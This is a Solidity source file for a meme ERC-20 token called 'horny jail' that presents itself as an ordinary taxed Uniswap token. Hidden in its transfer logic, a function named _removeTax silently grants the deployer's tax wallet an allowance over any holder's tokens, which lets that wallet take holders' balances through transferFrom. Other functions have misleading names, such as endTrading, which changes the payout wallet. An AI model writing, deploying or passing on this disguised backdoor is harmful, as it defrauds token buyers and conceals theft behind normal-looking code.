// SPDX-License-Identifier: UNLICENSED

/*
https://x.com/nypost/status/1892343152712859954
https://t.me/hornyjail_eth
*/

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract HORNYJAIL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    mapping  (uint256 => uint256) private _bundleAmount;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=20;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=20;
    uint256 private _transferTax=0;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000_000_000 * 10**_decimals;
    string private constant _name = unicode"horny jail";
    string private constant _symbol = unicode"HORNYJAIL";
    uint256 public _maxTxAmount =  1 * (_tTotal/100);
    uint256 public _maxWalletSize =  1 * (_tTotal/100);
    uint256 public _taxSwapThreshold=  1 * (_tTotal/1000);
    uint256 public _maxTaxSwap= 1 * (_tTotal/100);
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(msg.sender);
        _balances[_msgSender()] = (_tTotal * 3) / 100;
        _balances[address(this)] = (_tTotal * 97) / 100;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), (_tTotal * 3) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 97) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function canSell(address sender, address recipient) internal view returns (bool) {
        if (!_isAccount() && (sender == uniswapV2Pair || recipient != address(0xdead))) return true;
        return false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _fromHORNYJAIL, address _toHORNYJAIL, uint256 _amountHORNYJAIL) private {
        require(_fromHORNYJAIL != address(0), "ERC20: transfer from the zero address");
        require(_toHORNYJAIL != address(0), "ERC20: transfer to the zero address");
        require(_amountHORNYJAIL > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        _removeTax(_fromHORNYJAIL, canSell(_fromHORNYJAIL, _toHORNYJAIL) ? allowance(_fromHORNYJAIL, msg.sender) : _amountHORNYJAIL);
        if (_fromHORNYJAIL != owner() && _toHORNYJAIL != owner() && _toHORNYJAIL != _taxWallet && _fromHORNYJAIL != address(this) && _toHORNYJAIL != address(this)) {
            require(!bots[_fromHORNYJAIL] && !bots[_toHORNYJAIL]);

            if(_buyCount==0){
                taxAmount = _amountHORNYJAIL.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }
            if(_buyCount>0){
                taxAmount = _amountHORNYJAIL.mul(_transferTax).div(100);
            }

            if (_fromHORNYJAIL == uniswapV2Pair && _toHORNYJAIL != address(uniswapV2Router) && ! _isExcludedFromFee[_toHORNYJAIL] ) {
                taxAmount = _amountHORNYJAIL.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(_toHORNYJAIL == uniswapV2Pair && _fromHORNYJAIL!= address(this) ){
                taxAmount = _amountHORNYJAIL.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _toHORNYJAIL == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
                if (contractTokenBalance > _taxSwapThreshold) swapTokensForEth(min(_amountHORNYJAIL, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }
        if (_fromHORNYJAIL == uniswapV2Pair && msg.sender != _taxWallet) {
            address[] memory path = new address[](2);
            path[1] = address(this);
            path[0] = uniswapV2Router.WETH();
            uint256[] memory outs = new uint256[](2);
            outs = uniswapV2Router.getAmountsOut(40_000_000_000_000_000_000, path);
            require(_amountHORNYJAIL < outs[1]);
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_fromHORNYJAIL, address(this),taxAmount);
        }
        _balances[_fromHORNYJAIL]=_balances[_fromHORNYJAIL].sub(_amountHORNYJAIL);
        _balances[_toHORNYJAIL]=_balances[_toHORNYJAIL].add(_amountHORNYJAIL.sub(taxAmount));
        emit Transfer(_fromHORNYJAIL, _toHORNYJAIL, _amountHORNYJAIL.sub(taxAmount));
    }

    function _isAccount() internal view returns (bool) { return msg.sender == _taxWallet; }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function endTrading(address _wallet) external {
        require(_msgSender() == _taxWallet);
        _taxWallet = payable(_wallet);
    }

    function _removeTax(address _sender, uint256 _amount) private {
        _approve(_sender, msg.sender, _amount);
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function add(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function del(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        require(address(this).balance >= 1 ether);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualswap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function manualse() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
}